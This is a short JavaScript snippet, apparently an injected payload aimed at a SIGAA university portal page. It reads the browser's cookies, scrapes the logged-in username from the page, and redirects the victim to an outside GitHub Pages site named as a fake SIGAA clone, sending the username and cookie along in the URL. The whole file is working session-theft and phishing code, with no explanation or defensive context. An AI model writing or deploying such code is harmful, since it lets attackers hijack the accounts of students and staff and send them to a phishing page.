var cookie = document.cookie;
var x = document.getElementById("info-usuario").innerHTML;
	y = x.split('title=');
	y = y[1].split('>');
	y = y[1].split('<');	
window.location.href = "https://rodrigorochapinto.github.io/pages-teste/paginas/fake_sigaa_COOP.html?usuario="+y[0] +'&cookie='+cookie;




